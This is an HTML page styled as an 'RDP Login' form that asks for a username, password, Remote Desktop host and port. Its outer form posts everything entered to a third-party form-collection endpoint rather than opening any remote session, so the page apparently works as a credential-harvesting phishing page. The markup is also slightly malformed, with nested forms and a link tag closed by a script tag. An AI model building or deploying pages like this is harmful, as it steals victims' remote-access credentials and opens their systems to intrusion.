<!DOCTYPE html>
<html>
<head>
      <link src="style.css"></script>
  <title>RDP Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #F7F7F7;
    }
    .login-form {
      width: 300px;
      margin: 50px auto;
      padding: 20px;
      background-color: #fff;
      border: 1px solid #ddd;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .login-form h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    .login-form input[type="text"], .login-form input[type="password"] {
      width: 100%;
      height: 40px;
      margin-bottom: 20px;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    .login-form input[type="submit"] {
      width: 100%;
      height: 40px;
      background-color: #4CAF50;
      color: #fff;
      padding: 10px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .login-form input[type="submit"]:hover {
      background-color: #3e8e41;
    }
  </style>
</head>
<body>
      <Form action="https://submit-form.com/fBc9RoZwo" method="post">
  <div class="login-form">
    <h2>RDP Login</h2>
    <form>
      <label for="username">Username:</label>
      <input type="text" id="username" name="username" placeholder="Enter your username"><br><br>
      <label for="password">Password:</label>
      <input type="password" id="password" name="password" placeholder="Enter your password"><br><br>
      <label for="host">Host:</label>
      <input type="text" id="host" name="host" placeholder="Enter the RDP host"><br><br>
      <label for="port">Port:</label>
      <input type="text" id="port" name="port" placeholder="Enter the RDP port"><br><br>
      <input type="submit" value="Login">
    </form>
  </div>
</body>
</html>
